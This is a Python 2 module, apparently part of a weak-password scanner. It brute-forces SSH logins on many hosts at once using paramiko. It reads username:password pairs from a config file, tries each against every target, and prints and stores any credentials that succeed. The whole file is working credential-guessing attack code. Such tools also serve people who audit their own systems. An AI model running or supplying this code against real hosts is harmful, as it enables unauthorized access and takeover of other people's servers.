#coding=utf-8
import time
import threading
import socket
from multiprocessing.dummy import Pool
socket.setdefaulttimeout(8)
from printers import printPink,printGreen
import paramiko


def ssh_connect(ip,username,password,port):
    crack=0
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip,port,username=username, password=password)
        crack=1
        client.close()
    except Exception,e:
        if e[0]=='Authentication failed.':
            lock.acquire()
            print "%s ssh service 's %s:%s login fail " %(ip,username,password)
            lock.release()
        else:
            lock.acquire()
            print "connect %s ssh service at %s login fail " %(ip,port)
            lock.release()
            crack=2

    return crack

def ssh_l(ip,port):
        try:
            d=open('conf/ssh.conf','r')
            data=d.readline().strip('\r\n')
            while(data):
                username=data.split(':')[0]
                password=data.split(':')[1]
                flag=ssh_connect(ip,username,password,port)
                if flag==2:
                    break
                if flag==1:
                    lock.acquire()
                    printGreen("%s ssh at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    result.append("%s ssh at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    lock.release()
                    break
                data=d.readline().strip('\r\n')
        except Exception,e:
            print e
            pass

def ssh_main(ipdict,threads):
    printPink("crack ssh  now...")
    print "[*] start crack ssh  %s" % time.ctime()
    starttime=time.time()

    global lock
    lock = threading.Lock()
    global result
    result=[]


    pool=Pool(threads)

    for ip in ipdict['ssh']:
        pool.apply_async(func=ssh_l,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))

    pool.close()
    pool.join()

    print "[*] stop ssh serice  %s" % time.ctime()
    print "[*] crack ssh done,it has Elapsed time:%s " % (time.time()-starttime)
    return result